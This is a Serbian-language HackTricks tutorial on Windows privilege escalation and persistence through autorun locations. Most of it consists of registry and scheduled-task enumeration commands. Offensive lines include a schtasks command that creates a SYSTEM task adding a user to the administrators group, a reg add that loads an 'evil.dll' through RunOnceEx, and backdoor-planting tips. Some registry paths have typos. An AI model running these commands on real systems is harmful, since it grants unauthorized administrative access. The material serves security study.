# Eskalacija privilegija sa Autoruns

{% hint style="success" %}
Učite i vežbajte AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Učite i vežbajte GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Podržite HackTricks</summary>

* Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** nas na **Twitteru** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite hakerske trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
{% endhint %}

<figure><img src="../../.gitbook/assets/i3.png" alt=""><figcaption></figcaption></figure>

**Savjet za bug bounty**: **prijavite se** za **Intigriti**, premium **bug bounty platformu koju su kreirali hakeri, za hakere**! Pridružite nam se na [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) danas, i počnite da zarađujete nagrade do **$100,000**!

{% embed url="https://go.intigriti.com/hacktricks" %}

## WMIC

**Wmic** se može koristiti za pokretanje programa pri **pokretanju**. Pogledajte koji su binarni programi programirani da se pokrenu pri pokretanju sa:
```bash
wmic startup get caption,command 2>nul & ^
Get-CimInstance Win32_StartupCommand | select Name, command, Location, User | fl
```
## Zakazane Radnje

**Radnje** mogu biti zakazane da se izvršavaju sa **određenom frekvencijom**. Pogledajte koje su binarne datoteke zakazane za izvršavanje sa:
```bash
schtasks /query /fo TABLE /nh | findstr /v /i "disable deshab"
schtasks /query /fo LIST 2>nul | findstr TaskName
schtasks /query /fo LIST /v > schtasks.txt; cat schtask.txt | grep "SYSTEM\|Task To Run" | grep -B 1 SYSTEM
Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State

#Schtask to give admin access
#You can also write that content on a bat file that is being executed by a scheduled task
schtasks /Create /RU "SYSTEM" /SC ONLOGON /TN "SchedPE" /TR "cmd /c net localgroup administrators user /add"
```
## Folders

Sve binarne datoteke smeštene u **Startup folderima će biti izvršene prilikom pokretanja**. Uobičajeni startup folderi su oni navedeni u nastavku, ali je startup folder označen u registru. [Pročitajte ovo da saznate gde.](privilege-escalation-with-autorun-binaries.md#startup-path)
```bash
dir /b "C:\Documents and Settings\All Users\Start Menu\Programs\Startup" 2>nul
dir /b "C:\Documents and Settings\%username%\Start Menu\Programs\Startup" 2>nul
dir /b "%programdata%\Microsoft\Windows\Start Menu\Programs\Startup" 2>nul
dir /b "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup" 2>nul
Get-ChildItem "C:\Users\All Users\Start Menu\Programs\Startup"
Get-ChildItem "C:\Users\$env:USERNAME\Start Menu\Programs\Startup"
```
## Registry

{% hint style="info" %}
[Note from here](https://answers.microsoft.com/en-us/windows/forum/all/delete-registry-key/d425ae37-9dcc-4867-b49c-723dcd15147f): **Wow6432Node** registracija ukazuje na to da koristite 64-bitnu verziju Windows-a. Operativni sistem koristi ovu ključ za prikazivanje odvojene verzije HKEY\_LOCAL\_MACHINE\SOFTWARE za 32-bitne aplikacije koje se pokreću na 64-bitnim verzijama Windows-a.
{% endhint %}

### Runs

**Uobičajeno poznati** AutoRun registry:

* `HKLM\Software\Microsoft\Windows\CurrentVersion\Run`
* `HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce`
* `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run`
* `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce`
* `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
* `HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce`
* `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run`
* `HKCU\Software\Wow6432Npde\Microsoft\Windows\CurrentVersion\RunOnce`
* `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run`
* `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Runonce`
* `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunonceEx`

Registry ključevi poznati kao **Run** i **RunOnce** su dizajnirani da automatski izvršavaju programe svaki put kada se korisnik prijavi u sistem. Komandna linija dodeljena kao podatkovna vrednost ključa je ograničena na 260 karaktera ili manje.

**Service runs** (mogu kontrolisati automatsko pokretanje servisa tokom podizanja sistema):

* `HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce`
* `HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce`
* `HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices`
* `HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices`
* `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce`
* `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce`
* `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices`
* `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices`

**RunOnceEx:**

* `HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnceEx`
* `HKEY_LOCAL_MACHINE\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnceEx`

Na Windows Vista i novijim verzijama, **Run** i **RunOnce** registry ključevi se ne generišu automatski. Unosi u ovim ključevima mogu ili direktno pokrenuti programe ili ih odrediti kao zavisnosti. Na primer, da bi se učitao DLL fajl prilikom prijavljivanja, može se koristiti **RunOnceEx** registry ključ zajedno sa "Depend" ključem. Ovo se demonstrira dodavanjem registracijske stavke za izvršavanje "C:\temp\evil.dll" tokom pokretanja sistema:
```
reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d "C:\\temp\\evil.dll"
```
{% hint style="info" %}
**Eksploit 1**: Ako možete da pišete unutar bilo kog od pomenutih registra unutar **HKLM**, možete da eskalirate privilegije kada se prijavi drugi korisnik.
{% endhint %}

{% hint style="info" %}
**Eksploit 2**: Ako možete da prepišete bilo koji od binarnih fajlova navedenih u bilo kom od registra unutar **HKLM**, možete da modifikujete taj binarni fajl sa backdoor-om kada se prijavi drugi korisnik i eskalirate privilegije.
{% endhint %}
```bash
#CMD
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunE

reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices
reg query HKCU\Software\Wow5432Node\Microsoft\Windows\CurrentVersion\RunServices

reg query HKLM\Software\Microsoft\Windows\RunOnceEx
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\RunOnceEx
reg query HKCU\Software\Microsoft\Windows\RunOnceEx
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\RunOnceEx

#PowerShell
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunE'

Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices'

Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\RunOnceEx'
```
### Startup Path

* `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders`
* `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders`
* `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders`
* `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders`

Prečice postavljene u **Startup** fasciklu automatski će pokrenuti usluge ili aplikacije tokom prijavljivanja korisnika ili ponovnog pokretanja sistema. Lokacija **Startup** fascikle je definisana u registru za **Local Machine** i **Current User** opsege. To znači da će svaka prečica dodata ovim određenim **Startup** lokacijama osigurati da se povezana usluga ili program pokrene nakon procesa prijavljivanja ili ponovnog pokretanja, što ga čini jednostavnom metodom za zakazivanje programa da se automatski pokreću.

{% hint style="info" %}
Ako možete prepisati bilo koju \[User] Shell Folder pod **HKLM**, moći ćete da je usmerite na fasciklu koju kontrolišete i postavite backdoor koji će se izvršiti svaki put kada se korisnik prijavi u sistem, čime se povećavaju privilegije.
{% endhint %}
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" /v "Common Startup"
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" /v "Common Startup"
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" /v "Common Startup"
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" /v "Common Startup"

Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders' -Name "Common Startup"
```
### Winlogon Ključevi

`HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`

Obično je **Userinit** ključ postavljen na **userinit.exe**. Međutim, ako se ovaj ključ izmeni, navedeni izvršni fajl će takođe biti pokrenut od strane **Winlogon** prilikom prijavljivanja korisnika. Slično tome, **Shell** ključ je namenjen da upućuje na **explorer.exe**, koji je podrazumevani shell za Windows.
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Userinit"
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Shell"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -Name "Userinit"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -Name "Shell"
```
{% hint style="info" %}
Ako možete da prepišete vrednost registra ili binarni fajl, moći ćete da eskalirate privilegije.
{% endhint %}

### Podešavanja politike

* `HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer`
* `HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer`

Proverite ključ **Run**.
```bash
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "Run"
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "Run"
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer' -Name "Run"
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer' -Name "Run"
```
### AlternateShell

### Promena komande za bezbedan režim

U Windows registru pod `HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot`, postoji **`AlternateShell`** vrednost koja je podrazumevano postavljena na `cmd.exe`. To znači da kada izaberete "Safe Mode with Command Prompt" tokom pokretanja (pritiskom na F8), koristi se `cmd.exe`. Međutim, moguće je postaviti vaš računar da automatski startuje u ovom režimu bez potrebe da pritisnete F8 i ručno ga izaberete.

Koraci za kreiranje opcije za pokretanje koja automatski startuje u "Safe Mode with Command Prompt":

1. Promenite atribute `boot.ini` datoteke da uklonite read-only, system i hidden oznake: `attrib c:\boot.ini -r -s -h`
2. Otvorite `boot.ini` za uređivanje.
3. Umetnite liniju kao što je: `multi(0)disk(0)rdisk(0)partition(1)\WINDOWS="Microsoft Windows XP Professional" /fastdetect /SAFEBOOT:MINIMAL(ALTERNATESHELL)`
4. Sačuvajte promene u `boot.ini`.
5. Ponovo primenite originalne atribute datoteke: `attrib c:\boot.ini +r +s +h`

* **Eksploit 1:** Promena **AlternateShell** registry ključa omogućava prilagođenu postavku komandne ljuske, potencijalno za neovlašćen pristup.
* **Eksploit 2 (PATH Write Permissions):** Imati dozvole za pisanje u bilo koji deo sistema **PATH** promenljive, posebno pre `C:\Windows\system32`, omogućava vam da izvršite prilagođeni `cmd.exe`, što bi mogla biti zadnja vrata ako se sistem pokrene u bezbednom režimu.
* **Eksploit 3 (PATH i boot.ini Write Permissions):** Pristup za pisanje u `boot.ini` omogućava automatsko pokretanje u bezbednom režimu, olakšavajući neovlašćen pristup prilikom sledećeg ponovnog pokretanja.

Da proverite trenutnu **AlternateShell** postavku, koristite ove komande:
```bash
reg query HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot /v AlternateShell
Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SafeBoot' -Name 'AlternateShell'
```
### Installed Component

Active Setup je funkcija u Windows-u koja **pokreće pre nego što se radno okruženje potpuno učita**. Prioritizuje izvršavanje određenih komandi, koje moraju biti završene pre nego što se prijavljivanje korisnika nastavi. Ovaj proces se dešava čak i pre nego što se aktiviraju drugi startni unosi, kao što su oni u Run ili RunOnce registrima.

Active Setup se upravlja kroz sledeće registre:

* `HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components`
* `HKLM\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components`
* `HKCU\SOFTWARE\Microsoft\Active Setup\Installed Components`
* `HKCU\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components`

Unutar ovih ključeva postoje različiti podključevi, od kojih svaki odgovara određenoj komponenti. Ključne vrednosti od posebnog interesa uključuju:

* **IsInstalled:**
* `0` označava da komanda komponente neće biti izvršena.
* `1` znači da će se komanda izvršiti jednom za svakog korisnika, što je podrazumevano ponašanje ako vrednost `IsInstalled` nedostaje.
* **StubPath:** Definiše komandu koja će biti izvršena od strane Active Setup-a. Može biti bilo koja validna komandna linija, kao što je pokretanje `notepad`.

**Security Insights:**

* Modifikovanje ili pisanje u ključ gde je **`IsInstalled`** postavljen na `"1"` sa specifičnim **`StubPath`** može dovesti do neovlašćenog izvršavanja komandi, potencijalno za eskalaciju privilegija.
* Menjanje binarnog fajla na koji se poziva u bilo kojoj **`StubPath`** vrednosti takođe može postići eskalaciju privilegija, uz dovoljno dozvola.

Da biste pregledali **`StubPath`** konfiguracije širom Active Setup komponenti, mogu se koristiti sledeće komande:
```bash
reg query "HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKCU\SOFTWARE\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKCU\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components" /s /v StubPath
```
### Browser Helper Objects

### Overview of Browser Helper Objects (BHOs)

Browser Helper Objects (BHOs) su DLL moduli koji dodaju dodatne funkcije Microsoftovom Internet Exploreru. Učitavaju se u Internet Explorer i Windows Explorer pri svakom pokretanju. Ipak, njihovo izvršavanje može biti blokirano postavljanjem **NoExplorer** ključa na 1, sprečavajući ih da se učitavaju sa instancama Windows Explorera.

BHOs su kompatibilni sa Windows 10 putem Internet Explorer 11, ali nisu podržani u Microsoft Edge, podrazumevanom pretraživaču u novijim verzijama Windows-a.

Da biste istražili BHOs registrovane na sistemu, možete pregledati sledeće registre:

* `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects`
* `HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects`

Svaki BHO je predstavljen svojim **CLSID** u registru, koji služi kao jedinstveni identifikator. Detaljne informacije o svakom CLSID-u mogu se naći pod `HKLM\SOFTWARE\Classes\CLSID\{<CLSID>}`.

Za upit BHOs u registru, mogu se koristiti sledeće komande:
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects" /s
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects" /s
```
### Internet Explorer Extensions

* `HKLM\Software\Microsoft\Internet Explorer\Extensions`
* `HKLM\Software\Wow6432Node\Microsoft\Internet Explorer\Extensions`

Napomena da će registar sadržati 1 novi unos za svaki dll i biće predstavljen sa **CLSID**. Informacije o CLSID-u možete pronaći u `HKLM\SOFTWARE\Classes\CLSID\{<CLSID>}`

### Font Drivers

* `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers`
* `HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers`
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers"
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers'
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers'
```
### Open Command

* `HKLM\SOFTWARE\Classes\htmlfile\shell\open\command`
* `HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command`
```bash
reg query "HKLM\SOFTWARE\Classes\htmlfile\shell\open\command" /v ""
reg query "HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command" /v ""
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Classes\htmlfile\shell\open\command' -Name ""
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command' -Name ""
```
### Opcije izvršavanja slika
```
HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options
HKLM\Software\Microsoft\Wow6432Node\Windows NT\CurrentVersion\Image File Execution Options
```
## SysInternals

Napomena da su sve lokacije gde možete pronaći autorune **već pretražene od strane**[ **winpeas.exe**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEASexe). Međutim, za **opsežniju listu automatski izvršenih** fajlova možete koristiti [autoruns](https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns) iz sysinternals:
```
autorunsc.exe -m -nobanner -a * -ct /accepteula
```
## Više

**Pronađite više Autoruns kao što su registri u** [**https://www.microsoftpressstore.com/articles/article.aspx?p=2762082\&seqNum=2**](https://www.microsoftpressstore.com/articles/article.aspx?p=2762082\&seqNum=2)

## Reference

* [https://resources.infosecinstitute.com/common-malware-persistence-mechanisms/#gref](https://resources.infosecinstitute.com/common-malware-persistence-mechanisms/#gref)
* [https://attack.mitre.org/techniques/T1547/001/](https://attack.mitre.org/techniques/T1547/001/)
* [https://www.microsoftpressstore.com/articles/article.aspx?p=2762082\&seqNum=2](https://www.microsoftpressstore.com/articles/article.aspx?p=2762082\&seqNum=2)
* [https://www.itprotoday.com/cloud-computing/how-can-i-add-boot-option-starts-alternate-shell](https://www.itprotoday.com/cloud-computing/how-can-i-add-boot-option-starts-alternate-shell)

<figure><img src="../../.gitbook/assets/i3.png" alt=""><figcaption></figcaption></figure>

**Bug bounty savet**: **prijavite se** za **Intigriti**, premium **bug bounty platformu koju su kreirali hakeri, za hakere**! Pridružite nam se na [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) danas, i počnite da zarađujete nagrade do **$100,000**!

{% embed url="https://go.intigriti.com/hacktricks" %}

{% hint style="success" %}
Učite i vežbajte AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Učite i vežbajte GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Podržite HackTricks</summary>

* Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** nas na **Twitteru** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite hakerske trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
{% endhint %}
